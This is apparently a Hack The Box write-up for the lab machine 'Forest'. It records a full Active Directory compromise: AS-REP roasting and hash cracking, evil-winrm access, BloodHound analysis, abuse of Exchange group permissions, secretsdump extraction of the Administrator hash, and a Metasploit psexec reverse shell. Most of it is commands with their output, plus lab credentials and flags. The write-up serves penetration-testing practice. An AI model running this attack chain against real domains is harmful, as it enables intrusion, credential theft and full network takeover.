===========================        Forest       ================================
===========================     hackthebox.eu   ================================

Started: 14/12/2019

The box is Forest, made by egre55 and mrb3n. It is a Windows box and it runs on
IP 10.10.10.161.

# === Network Analyzis ===
We give a name to the box in our hosts file
```
$ echo "10.10.10.161    forest.htb" >> /etc/hosts
``` 

We run a nmap scan:

```
$ nmap -sC -sV -oA nmap/initial forest.htb
```


Port 53 is a TCP socket running a DNS server (odd). We check DNS TXT record
version with dig:

```
$ dig @forest.htb version.bind chaos txt
```
Ports 88 is kerberos-sec. A security system for windows hosts.

## Scripted enumeration

Using `enum4linux` we enumerate the host automatically.
We found these users:
```
SM_2c8eef0a09b545acb # 9 other user like this one
HealthMailboxc3d7722 # 12 other user like this one
svc-alfresco
andy
krbtgt
lucinda
mark
santi
sebastien
Administrator
```

We found this:
```
 Server forest.htb allows sessions using username '', password ''
``` 

We need to find hashes for any password of these users.

Using impacket `GetNPUsers.py` :
```
root@kali:~/htb/forest# python GetNPUsers.py -dc-ip forest.htb -no-pass HTB/svc-alfresco
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$2[....]3$svc-alfresco@HTB:d7a32e5[....]
```

We crack this hash using hashcat:

```
$ hashcat -O -a 0 -r rules/best64.rule -m 18200 hash.txt rock-you.txt
...
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:d7a32e517710a3a76912...9581f2
Time.Started.....: Sat Dec 14 19:06:37 2019 (4 secs)
Time.Estimated...: Sat Dec 14 19:06:41 2019 (0 secs)
Guess.Base.......: File (rock-you.txt)
Guess.Mod........: Rules (rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 90713.9 kH/s (4.37ms) @ Accel:64 Loops:19 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 313087930/1104517645 (28.35%)
Rejected.........: 71610/313087930 (0.02%)
Restore.Point....: 4055967/14344385 (28.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-19 Iteration:0-19
Candidates.#1....: sagitario_18_007 -> s-dubb12
Hardware.Mon.#1..: Temp: 51c Fan: 30% Util: 67% Core:1923MHz Mem:4006MHz Bus:16
```

We found the creds "svc-alfresco:s3rvice". We try these creds with evil-winrm.
We access a Powershell Instance.

In ̀ C:\Users\svc-alfresco\Desktop\user.txt` we find user's hash.

```
PS C:\Users\svc-alfresco> type Desktop\user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
```

Using Bloodhound's PS1 collector we gather data about the target and feed it
to Bloodhound. We upload the PS1 file and import it

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module ./Sharphound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
    Directory: C:\Users\svc-alfresco\Documents
    Mode                LastWriteTime         Length Name
    -a----        2/10/2020  12:35 PM          13166 20200210123509_BloodHound.zip

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200210123509_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Documents\20200210123509_BloodHound.zip to 20200210123509_BloodHound.zip

SInfo: Download successful!
```

This commands generates files that we review in the Bloodhound software.

```
$ ls bloodhound/
computers.json  domains.json  groups.json  sessions.json  users.json
```

Looking for a path to Domain Admins via Bloodhound, we find that
"Exchange Windows Permissions" may allow us PrivEsc to Administrator.
As svc-alfresco, we will create an AD User, add it to said group, then use
secretsdump to dump the administrator hash.

```
PS $> Import-Module ActiveDirectory
PS $> New-ADUser shad
PS $> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members shad
PS $> Get-ADPrincipalGroupMembership shad
distinguishedName : CN=Domain Users,CN=Users,DC=htb,DC=local
GroupCategory     : Security
GroupScope        : Global
name              : Domain Users
objectClass       : group
objectGUID        : 7cd3af35-c652-400f-9fd9-345bf4b3fc7a
SamAccountName    : Domain Users
SID               : S-1-5-21-3072663084-364016917-1341370565-513

distinguishedName : CN=Remote Management Users,CN=Builtin,DC=htb,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
name              : Remote Management Users
objectClass       : group
objectGUID        : c193227f-7dac-48b8-90b9-161893eef8c5
SamAccountName    : Remote Management Users
SID               : S-1-5-32-580

distinguishedName : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
GroupCategory     : Security
GroupScope        : Universal
name              : Exchange Windows Permissions
objectClass       : group
objectGUID        : 64f0cc0d-8e1d-4506-98be-26c67dc5bed3
SamAccountName    : Exchange Windows Permissions
SID               : S-1-5-21-3072663084-364016917-1341370565-1121
```

We then use impacket's secretsdump.py:
```
python3 impacket/examples/secretsdump.py HTB.local/shad:shadislove@forest.htb
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

We then use that in a Metasploit smb PSExec connection.
```
$ msfconsole
msf5> use exploit/windows/smb/psexec
msf5> set payload windows/x64/meterpreter/reverse_tcp
msf5> set RHOST forest.htb
msf5> set SMBUser Administrator
msf5> set SMBPass aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
msf5> exploit

meterpreter> cd ../../
meterpreter> pwd
C:\
meterpreter> cd C:/Users/Administrator/Desktop
meterpreter> cat root.txt
f048153f202bbb2f82622b04d79129cc
meterpreter>
```

We owned the box.
